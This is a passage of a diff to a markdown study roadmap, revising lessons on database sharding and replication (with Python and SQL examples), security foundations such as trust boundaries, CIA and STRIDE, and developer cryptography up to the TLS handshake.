-ring.add("shard-e")                                    # add ONE shard
-after  = {k: ring.route(k) for k in keys}
-moved  = sum(1 for k in keys if before[k] != after[k])
+ring.add("shard-e")
+after = {k: ring.route(k) for k in keys}
+moved = sum(1 for k in keys if before[k] != after[k])
 print(f"consistent hash: adding 1 shard to 4 moves {moved/len(keys):.0%}")
-#  -> about 20%, which is roughly 1/N. THAT is the difference, and it is
-#     what makes horizontal growth an operation instead of a migration.
-
-# Check the distribution is actually even, which is what vnodes buy:
-from collections import Counter
 print(Counter(after.values()))
-
-# ============ 4. Cross-shard queries: what you lose ============
-class ShardedStore:
-    def __init__(self, shards: dict[str, object]):
-        self.shards = shards
-        self.ring = ConsistentHashRing(shards.keys())
-
-    # SINGLE-SHARD: cheap, because the shard key is in the query.
-    def get_user(self, user_id):
-        return self.shards[self.ring.route(user_id)].execute(
-            "SELECT * FROM users WHERE id = ?", (user_id,))
-
-    # SINGLE-SHARD: also cheap, because orders are CO-LOCATED with their
-    # user by using user_id as the shard key for both tables. This is the
-    # single most important sharding design technique.
-    def orders_for_user(self, user_id):
-        return self.shards[self.ring.route(user_id)].execute(
-            "SELECT * FROM orders WHERE user_id = ?", (user_id,))
-
-    # SCATTER-GATHER: expensive, and the latency is the SLOWEST shard's,
-    # not the average. This is what a query without the shard key costs.
-    def count_all_orders(self):
-        return sum(s.execute("SELECT COUNT(*) FROM orders")[0]
-                   for s in self.shards.values())
-
-    # SCATTER-GATHER WITH MERGE: fetch `limit` from EVERY shard, merge,
-    # then discard most of what you fetched. Note this only works because
-    # the global top-N must be contained in the per-shard top-N.
-    def recent_orders(self, limit=10):
-        candidates = []
-        for s in self.shards.values():
-            candidates += s.execute(
-                "SELECT * FROM orders ORDER BY created_at DESC LIMIT ?", (limit,))
-        candidates.sort(key=lambda r: r["created_at"], reverse=True)
-        return candidates[:limit]
-        # Cost: N * limit rows fetched to return `limit` rows. And with
-        # OFFSET it gets worse: page 100 requires fetching 100*limit from
-        # every shard, which is why sharded APIs use cursors (13.2).
-
-# ============ 5. Globally unique ids without a central counter ============
-class SnowflakeId:
-    """SERIAL does not work across shards: two shards would both issue 1.
-    A Snowflake id packs time, machine, and a counter into 64 bits, so it
-    is unique, sortable by creation time, and needs no coordination."""
-
-    EPOCH_MS = 1_700_000_000_000
-
-    def __init__(self, machine_id: int):
-        assert 0 <= machine_id < 1024
-        self.machine_id = machine_id
-        self._seq = 0
-        self._last_ms = -1
-
-    def next_id(self) -> int:
-        now = int(time.time() * 1000)
-        if now == self._last_ms:
-            self._seq = (self._seq + 1) & 0xFFF        # 4096 per ms per machine
-            if self._seq == 0:
-                while now <= self._last_ms:            # exhausted: wait 1 ms
-                    now = int(time.time() * 1000)
-        else:
-            self._seq = 0
-        self._last_ms = now
-        return (((now - self.EPOCH_MS) << 22)          # 41 bits: timestamp
-                | (self.machine_id << 12)             # 10 bits: machine
-                | self._seq)                          # 12 bits: sequence
-
-gen = SnowflakeId(machine_id=7)
-ids = [gen.next_id() for _ in range(5)]
-print(ids, "sorted?", ids == sorted(ids))
-# Sortable by time, which also means it has the INSERT LOCALITY that a
-# random UUIDv4 lacks (see Phase 63's page-split diagram). UUIDv7 is the
-# standardized version of this same idea.
 ```
 
 ```sql
--- ============ 6. Partitioning WITHIN one database: rung 7 of the ladder ==
--- No distribution, no shard key, no lost joins. Just smaller indexes and
--- bulk deletion that is a metadata operation instead of a million DELETEs.
+-- Partitioning WITHIN one database (ladder rung 7) — no lost joins
 CREATE TABLE events (
     id         BIGSERIAL,
     created_at TIMESTAMPTZ NOT NULL,
     payload    JSONB
 ) PARTITION BY RANGE (created_at);
 
-CREATE TABLE events_2026_07 PARTITION OF events
-    FOR VALUES FROM ('2026-07-01') TO ('2026-08-01');
 CREATE TABLE events_2026_08 PARTITION OF events
     FOR VALUES FROM ('2026-08-01') TO ('2026-09-01');
 
--- The planner prunes irrelevant partitions entirely:
-EXPLAIN SELECT * FROM events WHERE created_at >= '2026-08-01';
---  -> scans events_2026_08 ONLY. events_2026_07 is never opened.
-
--- And dropping old data is instant, rather than a million-row DELETE
--- that bloats the table and needs vacuuming:
-DROP TABLE events_2026_07;
-
--- NOTE the hotspot this creates on WRITES: every insert today goes to
--- events_2026_08. That is acceptable within one machine, and it is
--- exactly the range-partitioning hotspot that makes date a bad SHARD key.
-
--- ============ 7. Watch replication lag, on a real primary/replica pair ===
--- On the primary:
-SELECT client_addr, state, sent_lsn, replay_lsn,
-       pg_wal_lsn_diff(sent_lsn, replay_lsn) AS lag_bytes
-FROM pg_stat_replication;
-
--- On the replica:
-SELECT now() - pg_last_xact_replay_timestamp() AS lag_interval;
-
--- Generate load on the primary, then watch lag_bytes grow. That growing
--- number IS the window in which read-your-own-writes is broken.
+-- Dropping old data is metadata, not a million-row DELETE:
+-- DROP TABLE events_2026_07;
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Decision | Buys | Costs |
+| -------- | ---- | ----- |
+| Read replicas | Read scale + failover candidate | Lag; read-your-own-writes bugs |
+| Async replication | Fast writes | Possible loss of recent ACKs |
+| Sync replication | No lost ACKs | Latency; stalled writes |
+| Hash sharding | Even writes | Range queries; resize pain without consistent hashing |
+| Sharding at all | Horizontal write/storage scale | Cross-shard joins/txns/indexes become projects |
 
-This is the direct bridge into system design (Phase 81): "how would you scale this database" expects you to walk through replication before sharding (replication is simpler and solves availability + read scaling first), and to name the specific consistency trade-off each step introduces rather than presenting them as free performance wins.
+**PRACTICE:**
 
-The specific follow-ups worth rehearsing: "a user posts a comment and does not see it, why" (replication lag, and read-your-own-writes as the named fix); "what happens to writes acknowledged by a leader that then dies" (nothing good, under asynchronous replication, which is what synchronous commit buys you); "why not just `hash(key) % N`" (resizing remaps nearly everything, hence consistent hashing); "what shard key would you choose and what does it cost you" (there is no key that makes every query local, so name the queries you are making expensive); "how do you generate ids across shards" (Snowflake or UUIDv7, not `SERIAL`); and "how do you do a transaction across two shards" (you do not, so describe a saga). The strongest single move in this whole section is refusing to shard immediately: walking the eight-rung ladder and naming what evidence would justify moving up is a much better answer than reaching for the most complex tool first, and interviewers are explicitly listening for it.
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Report naive-hash vs consistent-hash move % from the playground; list the eight ladder rungs |
+| Easy | Three queries local if sharded by `customer_id`; three that are not |
+| Medium | Docker Postgres primary+replica; measure lag; reproduce then fix read-your-own-writes |
+| Medium | Partition by month; confirm pruning with `EXPLAIN`; time `DROP` vs bulk `DELETE` |
+| Hard | Shard key design for chat (users, conversations, messages) — which features become expensive? |
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE WITH A SMALL PROJECT:**
 
+Design a normalized bookstore schema (customers, books, orders, order_items), write the JOIN for "a customer's order history with titles," name indexes and their write cost, and describe adding a read replica if read traffic triples. Then build the [Phase 65 mini-project](../guides/Projects.md#cs-phase-65-project).
 
-| Difficulty | Task                                                                                                                                                                                                 |
-| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Run the naive-hash versus consistent-hash comparison above and report both percentages. Explain why the second one makes horizontal growth practical                                                 |
-| Easy       | List the eight rungs of the scaling ladder from memory, and say which are reversible                                                                                                                 |
-| Easy       | Explain, in two sentences, the difference between replication and partitioning and what each one buys                                                                                                |
-| Easy       | Name three queries that stay on one shard if you shard by `user_id`, and three that do not                                                                                                           |
-| Medium     | Stand up a Postgres primary and replica with Docker Compose, write to the primary, read from the replica, and measure the lag under load with `pg_stat_replication`                                  |
-| Medium     | Reproduce the read-your-own-writes bug against that pair, then fix it with leader stickiness and prove the fix                                                                                       |
-| Medium     | Kill the primary, promote the replica, and write down exactly which acknowledged writes were lost and why                                                                                            |
-| Medium     | Implement the consistent hash ring above without virtual nodes, then measure the distribution imbalance across five shards. Then add virtual nodes and measure again                                 |
-| Medium     | Implement scatter-gather for "the 10 most recent orders" across three shards and count how many rows you had to fetch to return 10                                                                   |
-| Medium     | Partition a table by month in Postgres, confirm partition pruning with `EXPLAIN`, then drop an old partition and compare the time to an equivalent `DELETE`                                          |
-| Medium     | Implement Snowflake id generation and verify that two generators with different machine ids never collide across a million ids each                                                                  |
-| Hard       | Design the sharding scheme for a chat application: messages, conversations, and users. Justify the shard key, then state which product features become expensive and how you would serve them anyway |
-| Hard       | Take a sharded setup and implement resharding from three shards to four with no downtime: double-write, backfill, verify, cut over, clean up. Write the rollback plan for each step                  |
-| Hard       | Implement a global secondary index over a sharded dataset two ways (scatter-gather on read, and a separately sharded index maintained on write) and compare the read and write costs                 |
-| Hard       | Shard a MySQL database with [Vitess locally](https://vitess.io/docs/get-started/local/) and perform a resharding operation while a load generator is running                                         |
-| Hard       | Read [Designing Data-Intensive Applications](https://dataintensive.net/) chapter 5, then write down three replication failure modes it names that this section does not                              |
+**WHAT THIS UNLOCKS NEXT:**
 
+Data can survive, be queried, structured, indexed, transacted, and scaled across machines. None of that asks *who* is allowed to read or change it — or what happens when the network and clients are untrusted. Packets already crossed machines you do not control (Phases 55–58). Persistent stores concentrate the blast radius of a stolen dump, a forged identity, or a query that turns input into instructions. That map of trust boundaries and threats is Story IX, starting at Phase 66.
 
-**PRACTICE WITH A SMALL PROJECT**
-
-Design a normalized schema (Phase 62.1) for a small e-commerce system (users, products, orders, order items), write the JOIN queries needed for "a user's order history with product names," identify which columns need an index and why, and describe - in words - how you'd add a read replica if read traffic tripled.
-
-**MASTERY CHECKPOINT FOR PHASE 65:** Design a schema, justify every foreign key, write a multi-table JOIN, name one column that needs an index and explain the read/write trade-off it introduces, and explain what ACID guarantee prevents a specific failure you invent yourself (e.g. a double-charged payment).
-
-**WHY THE NEXT TOPIC IS NEEDED - Security:** A database now correctly stores and serves an application's data. It has no opinion at all about *who* is allowed to see or change that data - every concept from Phases 55-65 so far assumes every request is trustworthy. It isn't. That is Story IX, starting at Phase 66.
 
 ---
 
@@ -13122,71 +11697,67 @@ Design a normalized schema (Phase 62.1) for a small e-commerce system (users, pr
 
 ---
 
-
-
 # PHASE 66 - Security Foundations
 
 **Track:** Data & Security
 
-**WHAT YOU WILL BE ABLE TO DO:** Name your system's trust boundaries and threats (CIA + a light STRIDE pass), and say why "encrypt the wire later" is not a substitute for knowing who you trust.
+**WHAT YOU WILL BE ABLE TO DO:** Draw trust boundaries for a small web app, name CIA failures and a light STRIDE pass, and explain why "encrypt the wire later" is not a substitute for knowing who you trust.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 55 (packets cross machines you do not control), Phase 56 (TCP delivers bytes, not trust), Phase 58 (HTTP is readable text on that channel), Phase 60-65 (data at rest has its own attackers).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 55–58 — packets and HTTP cross machines you do not control; Phase 60–65 — durable data concentrates blast radius.
 
-Security is not one final chapter bolted onto the end of this roadmap - every later defense (TLS, passwords, sessions, injection fixes) answers a weakness you can already name once you draw trust boundaries.
+**LEARNING RESOURCES:**
+
+- [Trust Boundaries vs Attack Surfaces (Practical DevSecOps)](https://www.youtube.com/watch?v=wkqzZZBe6jE)
+- [STRIDE Threat Modeling for Beginners (Netsec Explained)](https://www.youtube.com/watch?v=rEnJYNkUde0)
+- [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling)
+- [Cloudflare — What is the CIA triad?](https://www.cloudflare.com/learning/privacy/what-is-the-cia-triad/)
 
 ## 66.1 Threats, Trust Boundaries & the CIA Triad
 
-**WHY YOU ARE LEARNING THIS:** Jumping straight into TLS recipes teaches *a* defense before you can say *what* you are defending. Foundations mean: what must stay secret, what must stay untampered, who is allowed to act, and where the system stops trusting the outside world. Phase 67 owns the crypto toolkit (hashing, encryption, signing, TLS). This phase owns the map those tools sit on.
+Story VIII made the bookstore's data survive restarts, answer JOINs, stay correct under concurrency, and stretch across replicas. None of that asks *who* may read Ada's orders, change stock, or dump the customer table — or what happens when the browser and the public internet are untrusted. Packets already crossed machines you do not control. A durable store concentrates the blast radius of a stolen dump, a forged identity, or a query that turns input into instructions. Security foundations are the map; crypto, auth, and app defenses later hang on that map.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**WHERE TRUST STOPS:**
 
-- Best framing: [Trust Boundaries vs Attack Surfaces (Practical DevSecOps)](https://www.youtube.com/watch?v=wkqzZZBe6jE) *(Composio YouTube)*
-- Alternative: [STRIDE Threat Modeling for Beginners (Netsec Explained)](https://www.youtube.com/watch?v=rEnJYNkUde0) *(Composio YouTube)* - Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege
-- Written: [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling); Cloudflare / NIST high-level CIA explanations
-- Practice: draw one box diagram of a toy web app (browser, TLS edge, app server, DB) and mark every arrow that crosses a trust boundary
-
-**STEP-BY-STEP EXPLANATION**
-
-**CIA triad** (the three properties most defenses buy):
-
-| Letter | Means | Broken when... |
-| ------ | ----- | -------------- |
-| **Confidentiality** | Only intended parties can read | Packet sniffing, leaked DB dump, chatty logs |
-| **Integrity** | Data is not silently altered | Tampered cookies, bit-flips, unsigned updates |
-| **Availability** | The service can be used when needed | DDoS, lockout-as-DoS, accidental `DROP TABLE` |
-
-**Trust boundary:** a line where data or control crosses from a less-trusted place to a more-trusted place (browser → your API; internet → VPC; user input → SQL engine; CI runner → production secrets). Attacks concentrate on those lines.
-
-**Light STRIDE** (name the threat class, do not run a full pen-test course):
-
-1. **S**poofing identity  
-2. **T**ampering with data  
-3. **R**epudiation (denying an action without audit)  
-4. **I**nformation disclosure  
-5. **D**enial of service  
-6. **E**levation of privilege  
+A **trust boundary** is a line where data or control crosses from a less-trusted place to a more-trusted place. Attacks concentrate on those lines. For the bookstore:
 
 ```text
-Browser  --HTTP-->  Your API  --SQL-->  Database
-   ^                   ^                  ^
-   |                   |                  |
- untrusted           semi-trusted      most trusted
-                     (after auth)
+Browser  --HTTPS-->  API / app  --SQL-->  Postgres
+   ^                    ^                   ^
+ untrusted          semi-trusted         most trusted
+                    (after AuthN)        (DB creds + network)
 
-Every arrow is a trust boundary. TLS protects the first hop in transit.
-Password hashing protects secrets if the DB dump leaks.
-AuthZ checks stop elevation even after AuthN succeeds.
-Parameterized SQL stops "data" becoming "instructions" at the DB boundary.
+Also: CI runner → production secrets
+      Mobile app → same API
+      Admin laptop → ops tooling
 ```
 
-**PICTURE IT LIKE THIS**
+TLS protects the first hop *in transit*. Password hashing protects secrets if the DB dump leaks. Authorization stops elevation after login. Parameterized SQL stops "data" becoming "instructions" at the DB boundary. Each defense sits on a named boundary — without the map, you buy locks for the wrong door.
 
-A museum: the street is untrusted, the lobby is semi-trusted, the vault is trusted. Guards (auth), locked cases (encryption), visitor badges (sessions), and "do not touch" ropes (authorization) each protect a different boundary. Buying a better lock for the street door (TLS) does not replace knowing which rooms are vaults.
+**CIA — WHAT YOU ARE TRYING TO PRESERVE:**
 
-**SMALL WORKING EXAMPLE**
+| Letter | Means | Broken when… |
+| ------ | ----- | ------------ |
+| **Confidentiality** | Only intended parties can read | Packet sniffing, leaked dump, chatty logs |
+| **Integrity** | Data is not silently altered | Tampered cookies, unsigned updates, bit-flips |
+| **Availability** | The service can be used when needed | DDoS, lockout-as-DoS, accidental `DROP TABLE` |
+
+"Encrypt everything" alone is not a strategy: encryption buys confidentiality (and sometimes integrity). It does not decide who may act, and it does not keep the site up under a flood of login attempts.
+
+**LIGHT STRIDE — NAME THE THREAT CLASS:**
+
+You are not running a pen-test course. You are naming *kinds* of bad things so later phases have a vocabulary:
+
+1. **S**poofing identity — pretend to be Ada  
+2. **T**ampering — change an order total in transit or in a cookie  
+3. **R**epudiation — deny placing an order with no audit trail  
+4. **I**nformation disclosure — dump the customer table  
+5. **D**enial of service — exhaust login hashing or scrape the catalog  
+6. **E**levation of privilege — viewer becomes admin  
+
+A museum analogy still helps: the street is untrusted, the lobby is semi-trusted, the vault is trusted. Guards (auth), locked cases (encryption), badges (sessions), and "staff only" ropes (authorization) protect different boundaries. A better street door (TLS) does not replace knowing which rooms are vaults.
 
 ```python playground=cs-phase-66-trust-map
-# Sketch trust boundaries for a tiny app. Not crypto - ownership of risk.
+# Sketch trust boundaries for a tiny bookstore. Not crypto — ownership of risk.
 
 components = ["browser", "load_balancer", "app", "postgres", "object_storage"]
 edges = [
@@ -13210,17 +11781,17 @@ for k, v in threats.items():
     print(f"  {k}: {v}")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | Define CIA in your own words with one failure example each |
-| Medium | STRIDE a login form: name one concrete threat per letter (skip fancy tooling) |
+| Easy | Define CIA in your own words with one bookstore failure each |
+| Medium | STRIDE a login form: one concrete threat per letter (no fancy tooling) |
 | Hard | Draw trust boundaries for "mobile app + API + managed DB + third-party email" |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-**WHY THE NEXT TOPIC IS NEEDED - Cryptography for Developers:** Foundations name *what* must be protected. You still need the developer toolbox that actually protects confidentiality and integrity in transit and at rest - hashing vs encryption vs signing, TLS/HTTPS, and password hashing. That is Phase 67.
+You can name *what* must stay secret, intact, and available — and *where* trust ends. You still cannot protect the channel or stored passwords with the right developer tools. Hashing, encryption, signing, TLS, and password hashing are Phase 67 — not a cryptography degree, a toolbox keyed to this map.
 
 ---
 
@@ -13228,37 +11799,34 @@ for k, v in threats.items():
 
 ---
 
-
-
 # PHASE 67 - Cryptography for Developers
 
 **Track:** Data & Security
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain hashing vs encryption vs signing; walk a TLS/HTTPS handshake at developer depth; and store passwords with a slow adaptive hash (Argon2id / bcrypt) - never plaintext, never a fast general-purpose hash alone.
+**WHAT YOU WILL BE ABLE TO DO:** Separate hashing, encryption, and signing; sketch a TLS handshake at developer depth; store passwords with a slow adaptive hash (Argon2id / bcrypt) — never plaintext, never a fast general-purpose hash alone.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 66 (trust boundaries and CIA - you know *why* the channel and the database need protection), Phase 55-58 (HTTP rides on TCP across untrusted networks).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 66 — trust boundaries and CIA; Phase 55–58 — HTTP rides TCP across untrusted networks.
+
+**LEARNING RESOURCES:**
+
+- [7 Cryptography Concepts EVERY Developer Should Know (Fireship)](https://www.youtube.com/watch?v=NuyzuNBFWxQ)
+- [SSL, TLS, HTTPS Explained (ByteByteGo)](https://www.youtube.com/watch?v=j9QmMEWmcfo)
+- [The Illustrated TLS 1.3 Connection](https://tls13.xargs.org/)
+- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
+- [How NOT to Store Passwords! (Computerphile)](https://www.youtube.com/watch?v=8ZtInClXe1Q)
+- [Cloudflare — What happens in a TLS handshake?](https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/)
 
 ## 67.1 Hashing vs Encryption vs Signing
 
-**WHY YOU ARE LEARNING THIS:** Interviews and production bugs both start from mixing these three words. They are different tools: one is one-way fingerprinting, one is reversible secrecy, one is proof of origin/integrity. TLS and password storage (next sections) are *applications* of these ideas - not synonyms for "crypto."
+Phase 66 named the bookstore vault and the street. Interviews and production bugs both start from mixing three words that are different tools: one-way fingerprints, reversible secrecy, and proof of origin. TLS and password storage are *applications* of these ideas — not synonyms for "crypto."
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- [7 Cryptography Concepts EVERY Developer Should Know (Fireship)](https://www.youtube.com/watch?v=NuyzuNBFWxQ) *(Composio YouTube)*
-- [Hashing Algorithms and Security (Computerphile)](https://www.youtube.com/watch?v=b4b8ktEV4Bg) *(Composio YouTube)*
-- [Hashing and Digital Signatures (Professor Messer)](https://www.youtube.com/watch?v=EcGmQjl6XEo) *(Composio YouTube)*
-- Written: libsodium / OWASP crypto cheat-sheet high-level guidance - prefer battle-tested libraries; never invent protocols
-
-**STEP-BY-STEP EXPLANATION**
-
+**THREE TOOLS, THREE JOBS:**
 
 | Tool | Direction | Main job | Example use |
 | ---- | --------- | -------- | ----------- |
 | **Hash** | One-way | Integrity / fingerprints / password storage (with slow KDF) | `SHA-256(file)`, Argon2id(password) |
 | **Encryption** | Reversible with a key | Confidentiality | TLS record layer, sealed DB fields |
 | **Signing** | Private key signs; public verifies | Authenticity + integrity | TLS certificates, JWT `RS256`, software updates |
-
-Rules of thumb: hashes are not encryption; encrypting a password for login is usually the wrong design (use a slow hash); a signature proves who produced the bytes, not that the bytes are secret.
 
 ```text
 Hash:        message ──► digest          (cannot get message back)
@@ -13267,460 +11835,137 @@ Sign:        message + private key ──► signature
              verify(message, signature, public key) → ok / fail
 ```
 
-**WHY THE NEXT TOPIC IS NEEDED - TLS/HTTPS:** Phase 66 said the HTTP channel is untrusted. TLS is how browsers and servers combine asymmetric crypto (handshake / certificates) with symmetric crypto (bulk data) to buy confidentiality, integrity, and server authentication on that channel.
+Rules of thumb: hashes are not encryption; encrypting a password for login is usually the wrong design (use a slow hash); a signature proves who produced the bytes, not that the bytes are secret. Prefer battle-tested libraries — never invent protocols.
+
+**PRACTICE:**
+
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | For each of hash / encrypt / sign, name one bookstore use and one misuse |
+| Medium | Explain why "we encrypt passwords with AES" is usually the wrong login design |
+| Hard | Sketch which tool protects a downloadable ebook update vs a TLS session vs a password dump |
+
+**WHAT THIS UNLOCKS NEXT:**
+
+You can tell the tools apart. The bookstore's HTTP channel is still readable text on an untrusted path (Phases 55–58). TLS is how browsers and servers combine asymmetric crypto (handshake / certificates) with symmetric crypto (bulk data) to buy confidentiality, integrity, and *server authentication* on that channel — Phase 67.2.
 
 ---
 
 ## 67.2 TLS/HTTPS - Securing the Connection Itself (Canonical)
 
-**WHY YOU ARE LEARNING THIS:** Every layer built in Phase 55 and Phase 58 was designed for a network where nobody was listening. IP routes a packet through machines you do not control and cannot see. TCP guarantees the bytes arrive intact, and says nothing about who else read them on the way. HTTP writes credentials, session cookies, and personal data as plain, human-readable text into those bytes. The result is that on any shared network, every byte of every request is available to anyone on the path, and can be modified in flight without either endpoint noticing. TLS exists because the previous limitation was not a performance ceiling or a correctness bug but an assumption of trust that the internet's design never justified. Phase 66 named the trust boundary; this section is the canonical developer treatment of the protocol that defends it.
+Every layer from Phase 55 and Phase 58 assumed a network where nobody was listening. IP routes through machines you cannot see. TCP delivers bytes intact and says nothing about who else read them. HTTP writes credentials and cookies as plain text into those bytes. Phase 66 named the trust boundary; TLS is the protocol that defends the wire.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**THREE PROPERTIES, NOT ONE WORD:**
 
-- Best animated explanation: [SSL, TLS, HTTPS Explained (ByteByteGo)](https://www.youtube.com/watch?v=j9QmMEWmcfo) *(Composio YouTube)* - walks the handshake as a sequence diagram and, importantly, explains *why* the protocol switches from asymmetric to symmetric encryption partway through
-- Alternative: [SSL, TLS, HTTP, HTTPS Explained (PowerCert Animated Videos)](https://www.youtube.com/watch?v=hExRDVZHhig) - the clearest fully-animated version, and it places TLS correctly in the layer stack from Phase 55
-- Another angle: [Public Key Cryptography (Computerphile)](https://www.youtube.com/watch?v=GSIDS_lvRv4) explains the underlying mathematics without requiring any, and [What is Public Key Infrastructure? (IBM Technology)](https://www.youtube.com/watch?v=0ctat6RBrFo) covers the certificate-authority trust chain, which is the part that turns "encrypted" into "encrypted *to the right person*"
-- Interactive simulator: [Wireshark](https://www.wireshark.org/) is the essential tool here. Capture a page load, filter on `tls.handshake`, and read the real `ClientHello` and `ServerHello`. Then set `SSLKEYLOGFILE` in your environment, point Wireshark at it, and watch the same traffic become readable, which demonstrates exactly what the session key protects. Complement it with [SSL Labs' Server Test](https://www.ssllabs.com/ssltest/), which grades any public site's TLS configuration and explains every deduction, and [badssl.com](https://badssl.com/), which hosts deliberately broken certificates so you can see each failure mode your browser guards against
-- Written documentation: [Cloudflare Learning Center - What happens in a TLS handshake?](https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/), [Cloudflare Learning Center - What is Transport Layer Security (TLS)?](https://www.cloudflare.com/learning/security/glossary/transport-layer-security-tls2/), [High Performance Browser Networking chapter 4](https://hpbn.co/transport-layer-security-tls/) for the performance implications, and [The Illustrated TLS 1.3 Connection](https://tls13.xargs.org/), which annotates every single byte of a real handshake and is the single best resource in this entire section
-- GitHub implementation: [The Illustrated TLS Connection's source](https://github.com/syncsynchalt/illustrated-tls13) and [rustls](https://github.com/rustls/rustls), a modern TLS library written to be auditable. For the deliberately educational version, [BearSSL](https://bearssl.org/) is small enough to read
-- Practice platform: [Cryptopals](https://cryptopals.com/) - a free, famous set of exercises where you implement and then break real cryptographic constructions, which teaches why the protocol's details are not arbitrary. For the operational side, generate your own certificate authority with `openssl`, sign a certificate, and get your browser to trust it
+TLS buys **confidentiality** (observer cannot read), **integrity** (observer cannot modify undetected), and **authentication** (you know who you are talking to). Encryption alone gives only the first. An encrypted connection to an attacker is worthless — authentication does the heavy lifting.
 
-**STEP-BY-STEP EXPLANATION**
+**WHY BOTH KINDS OF CRYPTO:**
 
-TLS provides exactly three properties, and separating them is what makes the protocol comprehensible. **Confidentiality** means an observer cannot read the traffic. **Integrity** means an observer cannot modify it undetected. **Authentication** means you know who you are talking to. Encryption alone gives you only the first, and the third is the one that actually does the heavy lifting, because an encrypted connection to an attacker is worth nothing.
+**Asymmetric** crypto (keypair) solves agreeing on a secret while someone watches, but it is slow. **Symmetric** crypto is fast once both sides share a key, but cannot invent that shared key in public. TLS uses asymmetric work during the handshake to establish a **session key**, then uses that key for every application byte.
 
-The core design move is combining two kinds of cryptography, because each solves a problem the other cannot. **Asymmetric** cryptography uses a keypair where the public key encrypts and only the private key decrypts, which solves the otherwise impossible problem of establishing a shared secret over a channel someone is watching. It is also roughly a thousand times slower than the alternative. **Symmetric** cryptography uses one shared key for both directions and is extremely fast, and it cannot solve the problem of agreeing on that key in the first place. TLS therefore uses asymmetric cryptography once, during the handshake, purely to establish a symmetric session key, and then uses that symmetric key for every byte of actual data. That single sentence is the answer to "how does TLS work" and it is what interviewers are listening for.
+Modern TLS uses **Diffie–Hellman key exchange**: both sides contribute randomness and derive the same secret without sending it. That buys **forward secrecy** — steal the server's long-term private key next year and yesterday's recorded traffic still stays sealed. TLS 1.3 made forward secrecy mandatory and cut the handshake toward one round trip.
 
-Modern TLS does not actually *send* the session key encrypted with the server's public key, and the reason matters. It uses **Diffie-Hellman key exchange**, where both sides contribute a random value and independently derive the same shared secret without that secret ever crossing the wire in any form. The property this buys is **forward secrecy**: because the session key was never transmitted and is discarded afterwards, an attacker who records today's traffic and steals the server's private key next year still cannot decrypt it. With the older RSA key transport, that same stolen key would decrypt every recorded session retroactively, which is precisely why TLS 1.3 removed it entirely.
+**CERTIFICATES ARE SIGNED STATEMENTS:**
 
-The **certificate** is what supplies authentication, and it is a signed statement rather than a secret. A certificate contains the server's public key, the domain names it is valid for, an expiry window, and a signature from a **certificate authority**. Your browser ships with a list of root certificate authorities it trusts, and validation walks the chain from the server's certificate up through any intermediates to one of those roots, checking at each step that the signature is genuine, the certificate has not expired, and the domain matches what you typed. This is the step that prevents a man-in-the-middle: an attacker can present a certificate for `yourbank.com`, but cannot get a trusted authority to sign it. It also means the entire system's security rests on the certificate authorities behaving correctly, which is why **certificate transparency** logs exist, so that a misissued certificate becomes publicly detectable.
-
-TLS 1.3 is worth understanding as a deliberate simplification rather than an incremental upgrade. It cut the handshake from two round trips to one, removed every cipher suite with a known weakness including RSA key transport and CBC mode, made forward secrecy mandatory rather than optional, and encrypted more of the handshake itself. The practical result is that TLS 1.3 is both faster and safer than 1.2, which is unusual and is why "use 1.3, disable everything below 1.2" is uncontroversial advice.
-
-Two operational details cause most real-world TLS problems. **SNI**, or Server Name Indication, is an extension where the client states which hostname it wants *before* the server sends a certificate, which is what allows one IP address to serve many HTTPS sites, and it is sent unencrypted in TLS 1.3 by default, so the hostname you visit is still observable even though the content is not. And **HSTS**, the `Strict-Transport-Security` header, tells a browser to refuse plain HTTP for a domain in future, which closes the gap where a user's first request to `example.com` travels unencrypted before the redirect to HTTPS arrives. Without HSTS, that first request is an attackable moment on every visit.
-
-**System -> Weakness -> Attack -> Consequence -> Defense**
+A certificate holds the server's public key, valid names, expiry, and a signature from a **certificate authority**. Your browser trusts a root store; validation walks the chain and checks signature, dates, hostname (SAN), and revocation. Self-signed encryption can still work — authentication fails, which is why the browser warns.
 
 ```text
-System:      Plain HTTP (Phase 58) sends requests and responses as
-             readable plain text over the TCP connection from Phase 56.
-Weakness:    Anyone who can observe network traffic between client and
-             server (a shared Wi-Fi network, a compromised router) can
-             read every byte -- including passwords typed into a login form.
-Attack:      Passive eavesdropping, or active tampering (modifying the
-             response in transit, e.g. injecting malicious content).
-Consequence: Credentials, personal data, and session tokens (Phase 68) are
-             exposed to anyone on the network path.
-Defense:     TLS (Transport Layer Security) -- encrypts the connection
-             itself, between the TCP handshake and the first HTTP byte,
-             so the same eavesdropper sees only unreadable ciphertext.
-Trade-off:   A TLS handshake adds its own round-trip(s) of latency before
-             any application data can be sent (mitigated, not eliminated,
-             by session resumption on repeat visits).
+Client -> Server: ClientHello (versions, cipher suites, key share)
+Server -> Client: ServerHello + certificate + key share + Finished
+Client verifies chain; both derive session keys
+        -- from here, HTTP bytes are ciphertext on the wire --
 ```
-
-**Internal Working, Step by Step (simplified TLS handshake, happening right after Phase 56's TCP handshake completes):**
 
 ```text
-Client -> Server: "ClientHello" (supported TLS versions, cipher suites)
-Server -> Client: "ServerHello" + its certificate (proves server identity,
-                   signed by a trusted Certificate Authority) + a public key
-Client verifies the certificate, then both sides derive a shared symmetric
-   encryption key for this session (without ever sending that key in the clear)
